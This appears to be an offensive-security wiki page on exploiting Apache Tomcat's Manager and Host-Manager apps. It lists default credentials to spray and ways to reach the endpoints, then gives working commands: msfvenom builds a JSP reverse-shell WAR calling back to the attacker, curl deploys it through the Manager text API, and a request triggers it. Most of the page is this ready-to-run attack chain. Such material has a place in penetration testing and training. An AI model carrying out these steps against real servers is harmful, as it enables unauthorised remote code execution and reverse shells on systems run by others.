---
title: "Tomcat Manager and Host-Manager: WAR deployment to RCE"
description: "Exploiting the Tomcat Manager and Host-Manager applications: default and weak credentials, reaching the deploy endpoint, and uploading a WAR webshell for remote code execution."
keywords:
  - tomcat manager
  - host-manager
  - WAR deploy
  - default credentials
  - tomcat rce
---

# Manager and Host-Manager

Tomcat bundles management web apps, `/manager/html` (and the text API `/manager/text`) and `/host-manager/html`, that can **deploy a web application**. Deploying a WAR runs its code, so access to Manager is direct RCE. The usual way in is default or weak credentials, or reaching the endpoint when it is not locked to an admin network.

## Getting access

- **Default and weak credentials**: `tomcat:tomcat`, `admin:admin`, `tomcat:s3cret`, `admin:<blank>`, and vendor defaults in `tomcat-users.xml`. The Manager requires a user with the `manager-gui`/`manager-script` role.
- **Leaked credentials**: `tomcat-users.xml` recovered through [AJP/Ghostcat](ajp-ghostcat.md), an exposed `.git`/backup, or a traversal read.
- **Reaching the endpoint**: `/manager/html`, `/manager/text`, `/host-manager/html`; sometimes only localhost-restricted at the app but reachable via a [proxy normalization mismatch](../reverse-proxy-and-edge/normalization-mismatch.md) or [origin exposure](../reverse-proxy-and-edge/origin-exposure.md).

## Deploying a WAR

Build a WAR containing a JSP webshell and deploy it through the text API:

```bash
# Build a JSP webshell WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=you LPORT=4444 -f war > shell.war

# Deploy via the Manager text API (manager-script role)
curl -u tomcat:tomcat -T shell.war \
  "http://target:8080/manager/text/deploy?path=/shell&update=true"

# Trigger it
curl "http://target:8080/shell/"
```

The GUI (`/manager/html`) offers the same via a file-upload form. `host-manager` creates virtual hosts and can be abused similarly where Manager is locked down.

## Exploitation

- Spray the common default credentials against `/manager/text/list` (a `200` with an app list confirms access and role).
- Deploy a JSP shell WAR, request its context path, and you have code execution as the Tomcat user.
- If only `manager-gui` (not `manager-script`) is available, use the HTML upload form; if the CSRF token blocks scripting, drive the GUI through the browser flow.

## Tools

- **msfvenom** (WAR payload), Metasploit `tomcat_mgr_deploy`/`tomcat_mgr_upload`, **hydra** for credential spraying.

## References

- Apache Tomcat: Manager App HOW-TO, realm and role configuration
- OWASP: Testing for default credentials
